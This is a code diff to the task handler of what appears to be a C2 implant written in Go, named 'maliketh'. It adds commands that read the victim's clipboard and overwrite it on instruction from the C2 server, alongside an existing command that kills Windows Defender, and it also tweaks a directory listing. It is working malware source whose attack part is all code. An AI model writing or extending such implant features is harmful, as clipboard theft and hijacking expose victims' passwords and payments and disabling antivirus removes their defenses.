@@ -18,6 +18,7 @@ import (
 
 	oslib "maliketh/pkg/os"
 
+	"github.com/atotto/clipboard"
 	"github.com/denisbrodbeck/machineid"
 )
 
@@ -57,6 +58,10 @@ func Handle(c2Url string, task models.Task, profile models.MalleableProfile) {
 		output, err = Whoami()
 	case models.OP_DISABLE_DEFENDER:
 		output, err = DisableDefender()
+	case models.OP_GET_CLIPBOARD:
+		output, err = GetClipboardData()
+	case models.OP_SET_CLIPBOARD:
+		output, err = SetClipboardData(task.Args.(string))
 	}
 
 	if err != nil {
@@ -252,7 +257,7 @@ func Ls() (output string, err error) {
 		return "", err
 	}
 	for _, f := range files {
-		output += f.Type().String() + "  " + f.Name() + "\n"
+		output += f.Type().Perm().String() + "  " + f.Name() + "\n"
 	}
 	return output, nil
 }
@@ -280,4 +285,12 @@ func Whoami() (output string, err error) {
 // Disable Windows Defender
 func DisableDefender() (output string, err error) {
 	return "", oslib.PkillAv()
+}
+
+func GetClipboardData() (output string, err error) {
+	return clipboard.ReadAll()
+}
+
+func SetClipboardData(data string) (output string, err error) {
+	return "", clipboard.WriteAll(data)
 }
